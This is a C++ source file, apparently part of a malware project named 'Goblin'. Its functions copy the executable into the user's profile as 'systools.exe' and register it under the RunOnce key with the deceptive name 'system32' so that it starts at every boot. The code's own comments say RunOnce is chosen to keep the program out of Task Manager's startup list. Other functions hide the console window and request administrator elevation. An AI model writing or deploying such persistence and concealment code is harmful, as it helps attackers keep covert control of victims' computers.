#include "Malware_behav.h"
#include <string>
#include <Shlobj.h> 
#include <wtypes.h>
#include <fstream>
#include <sstream>
#include <shellapi.h>


using namespace std;

// Path of the final destination of the program
WCHAR script_path[MAX_PATH + 1];
WCHAR final_destination_path[MAX_PATH + 1];

// Edits the Windows registry to make the program run at boot
// Based on https://docs.microsoft.com/en-us/windows/win32/setupapi/run-and-runonce-registry-keys?redirectedfrom=MSDN
bool config_run_at_boot() {
	wstring final_dest(final_destination_path);

	HKEY hkey = NULL;
	// Use 'RunOnce' to not display the program in task manager's startup section. DON'T FORGET 'RunOnce' register will
	// disappear every time the task runs successfully (every time the computer boots). Hence, you must call this function 
	// everytime this program starts (assuming it will only start at boot)
	LONG createStatus = RegCreateKey(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", &hkey);

	if (createStatus != ERROR_SUCCESS) {
		//printf("RegCreateKey (false)");
		return false;
	}

	LONG status = RegSetValueEx(hkey, L"system32", 0, REG_SZ, (BYTE*)final_dest.c_str(), (final_dest.size() + 1) * sizeof(wchar_t));

	if (status != ERROR_SUCCESS) {
		//printf("RegSetValueEx (false)");
		return false;
	}

	return true;
}

// Creates a copy of this executable and a script to run it on boot in the defined path (C:\Users\<user>)
bool create_copy() {
	WCHAR this_exe_path[MAX_PATH + 1];

	if (!(S_OK == SHGetFolderPathW(NULL, CSIDL_PROFILE, NULL, 0, final_destination_path))) {
		return false;
	}

	// Get current program's file path
	GetModuleFileName(NULL, this_exe_path, _MAX_PATH);

	// Copy the file to it's final destination
	wcscat_s(final_destination_path, L"\\systools.exe");

	if (CopyFile(this_exe_path, final_destination_path, false)) {
		return true;
	}

	return false;
}

void hide_window() {
	ShowWindow(GetConsoleWindow(), SW_HIDE);
}

bool run_as_admin() {
	HINSTANCE result = ShellExecute(NULL,
		L"runas",
		L"Goblin.exe",
		NULL,
		NULL,
		SW_SHOWNORMAL
	);

	if ((INT_PTR)result <= 32) {
		std::fstream o;
		o.open("log.txt", std::ios_base::app);
		o << "ERROR runAsAdmin " << (INT_PTR)result << std::endl;
		o.close();
		return false;
	}

	return true;
}

bool is_running_as_admin() {
	bool fRet = FALSE;
	HANDLE hToken = NULL;

	if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
		TOKEN_ELEVATION Elevation;
		DWORD cbSize = sizeof(TOKEN_ELEVATION);
		if (GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &cbSize)) {
			fRet = Elevation.TokenIsElevated;
		}
	}

	if (hToken) {
		CloseHandle(hToken);
	}

	return fRet;
}